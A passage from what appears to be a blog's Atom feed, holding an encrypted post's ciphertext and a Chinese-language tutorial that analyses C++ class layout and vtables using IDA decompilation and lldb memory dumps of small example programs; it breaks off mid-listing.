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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      something you can not kown 
    
    </summary>
    
      <category term="misc" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/misc/"/>
    
    
      <category term="正则表达式" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"/>
    
  </entry>
  
  <entry>
    <title>C++类结构以及vtable分析</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/C++%E7%B1%BB%E7%BB%93%E6%9E%84%E4%BB%A5%E5%8F%8Avtable%E5%88%86%E6%9E%90/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/12/02/C++类结构以及vtable分析/C++类结构以及vtable分析/</id>
    <published>2017-12-02T10:07:00.000Z</published>
    <updated>2019-03-01T02:51:19.937Z</updated>
    
    <content type="html"><![CDATA[<h3 id="C-类结构以及vtable分析"><a href="#C-类结构以及vtable分析" class="headerlink" title="C++类结构以及vtable分析"></a>C++类结构以及vtable分析</h3><blockquote><p>通过实验自己对一些C++数据结构的理解</p></blockquote><h3 id="实验一"><a href="#实验一" class="headerlink" title="实验一"></a>实验一</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {   public:      void setWidth(int w)      {         width = w;      }      void setHeight(int h)      {         height = h;      }   protected:      int width;      int height;};// 派生类class Rectangle: public Shape{   public:      int getArea()      {          return (width * height);       }};int main(void){   Rectangle Rect;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST08_8  unsigned int v4; // eax  char v6; // [rsp+10h] [rbp-20h]  int v7; // [rsp+1Ch] [rbp-14h]  __int64 (__fastcall *v8)(_QWORD); // [rsp+20h] [rbp-10h]  __int64 v9; // [rsp+28h] [rbp-8h]  v7 = 0;  Shape::setWidth((Shape *)&amp;v6, 5);  Shape::setHeight((Shape *)&amp;v6, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v6);  v9 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v8 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v9);  return 0;}</code></pre><p>Rect内存布局</p><pre><code>(lldb) x/20b $rbp-0x200x7ffeefbff560: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x000x7ffeefbff568: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</code></pre><p>能得到的结论是，在编译完后，子类Rectangle的方法调用都编译成父类Shape方法调用，这是在编译时就决定了的。把子类对象和参数合并作为参数传入父类方法。这里仅仅是对子类对象另个偏移值做操作。</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  void *v3; // ST10_8  __int64 v4; // ST08_8  unsigned int v5; // eax  __int64 v6; // ST38_8  v3 = (void *)operator new(8uLL);  memset(v3, 0, 8uLL);  Shape::setWidth((Shape *)v3, 5);  Shape::setHeight((Shape *)v3, 7);  v4 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total area: &quot;);  v5 = Rectangle::getArea((Rectangle *)v3);  v6 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v4, v5);  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v6);  return 0;}</code></pre><p>这里将 Rectangle Rect改为Rectangle *Rect = new Rectangle()在堆上申请内存可以看出，在类初始化的时候，仅仅申请了一块8字节空间，正好是两个int的大小，仅此而已。</p><h3 id="实验二"><a href="#实验二" class="headerlink" title="实验二"></a>实验二</h3><pre><code class="c++">#include &lt;iostream&gt;using namespace std;// 基类class Shape {public:   // 提供接口框架的纯虚函数   virtual int getArea() = 0;   void setWidth(int w)   {      width = w;   }   void setHeight(int h)   {      height = h;   }protected:   int width;   int height;};// 派生类class Rectangle: public Shape{public:   int getArea()   {       return (width * height);    }};class Triangle: public Shape{public:   int getArea()   {       return (width * height)/2;    }};int main(void){   Rectangle Rect;   Triangle  Tri;   Rect.setWidth(5);   Rect.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Rectangle area: &quot; &lt;&lt; Rect.getArea() &lt;&lt; endl;   Tri.setWidth(5);   Tri.setHeight(7);   // 输出对象的面积   cout &lt;&lt; &quot;Total Triangle area: &quot; &lt;&lt; Tri.getArea() &lt;&lt; endl;    return 0;}</code></pre><p>上面的代码编译完成后，在ida中反汇编如下</p><pre><code class="c++">int __cdecl main(int argc, const char **argv, const char **envp){  __int64 v3; // ST20_8  unsigned int v4; // eax  __int64 v5; // ST10_8  unsigned int v6; // eax  char v8; // [rsp+28h] [rbp-48h]  char v9; // [rsp+38h] [rbp-38h]  int v10; // [rsp+4Ch] [rbp-24h]  __int64 (__fastcall *v11)(_QWORD); // [rsp+50h] [rbp-20h]  __int64 v12; // [rsp+58h] [rbp-18h]  __int64 (__fastcall *v13)(_QWORD); // [rsp+60h] [rbp-10h]  __int64 v14; // [rsp+68h] [rbp-8h]  v10 = 0;  Rectangle::Rectangle((Rectangle *)&amp;v9);  Triangle::Triangle((Triangle *)&amp;v8);  Shape::setWidth((Shape *)&amp;v9, 5);  Shape::setHeight((Shape *)&amp;v9, 7);  v3 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Rectangle area: &quot;);  v4 = Rectangle::getArea((Rectangle *)&amp;v9);  v12 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v3, v4);  v11 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v12);  Shape::setWidth((Shape *)&amp;v8, 5);  Shape::setHeight((Shape *)&amp;v8, 7);  v5 = std::__1::operator&lt;&lt;&lt;std::__1::char_traits&lt;char&gt;&gt;(&amp;std::__1::cout, &quot;Total Triangle area: &quot;);  v6 = Triangle::getArea((Triangle *)&amp;v8);  v14 = std::__1::basic_ostream&lt;char,std::__1::char_traits&lt;char&gt;&gt;::operator&lt;&lt;(v5, v6);  v13 = std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;;  std::__1::endl&lt;char,std::__1::char_traits&lt;char&gt;&gt;(v14);  return 0;}</code></pre><p>这里与实验一明显不同在于，在初始化一个对象的时候会调用其构建方法。其反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Rectangle::Rectangle(Rectangle *this){  __int64 *result; // rax  Shape::Shape(this);  result = &amp;`vtable for&#39;Rectangle + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Rectangle + 2;  return result;}</code></pre><p>这里发现里面还调用了父类的构建方法，父类构建方法反汇编代码如下</p><pre><code class="c++">__int64 *__fastcall Shape::Shape(Shape *this){  __int64 *result; // rax  result = &amp;`vtable for&#39;Shape + 2;  *(_QWORD *)this = &amp;`vtable for&#39;Shape + 2;  return result;}</code></pre><p>其实这两个构建方法就是对传入对象this指针赋值操作，在经过Shape::Shape(this)后其实this指针的64字节大小值为父类Shape的虚函数表地址。然后又被重新赋值为Rectangle自己的虚函数表地址。</p><p>这里的虚函数表地址，本质就是_DATA段的一个数据结构。</p><p>Rect的内存布局为</p><pre><code>(lldb) x/20b $rbp-0x380x7ffeefbff548: 0x20 0x21 0x00 0x00 0x01 0x00 0x00 0x000x7ffeefbff550: 0x05 0x00 0x00 0x00 0x07 0x00 0x00 0x00</code></pre><p>这里可以看到前64字节为虚函数表地址，后面两个32字节分别是其width和height</p><p>去ida中查看该地址</p><pre><code class="c++">__data:0000000100002110 ; `vtable for&#39;Rectangle__data:0000000100002110 __ZTV9Rectangle dq 0                    ; DATA XREF: __got:__ZTV9Rectangle_ptr↑o__data:0000000100002110                                         ; offset to this__data:0000000100002118                 dq offset __ZTI9Rectangle ; `typeinfo for&#39;Rectangle__data:0000000100002120                 dq offset __ZN9Rectangle7getAreaEv ; 